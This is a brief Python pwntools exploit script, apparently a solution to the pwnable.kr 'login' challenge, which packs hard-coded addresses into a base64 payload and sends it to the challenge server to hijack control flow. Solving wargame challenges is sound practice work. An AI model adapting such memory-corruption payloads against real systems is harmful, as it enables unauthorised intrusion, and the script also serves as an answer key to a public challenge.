from pwn import *
import base64 
# A*0xc QUFBQUFBQUFBQUFB
# QUFBQUFBQUFA6xEI

g = cyclic_gen()

data = p32(0xdeadbeef) + p32(0x0804925f) + p32(0x0811eb40)
#         break *0x08049397

#p = gdb.debug("./login", """
#        continue
#""")

b64data = base64.b64encode(data)
print(b64data)
print(len(b64data))
#p = process("./login")
p = remote("pwnable.kr", 9003)
print(p.readuntil(b"Authenticate : "))

p.sendline(b64data)
p.interactive()
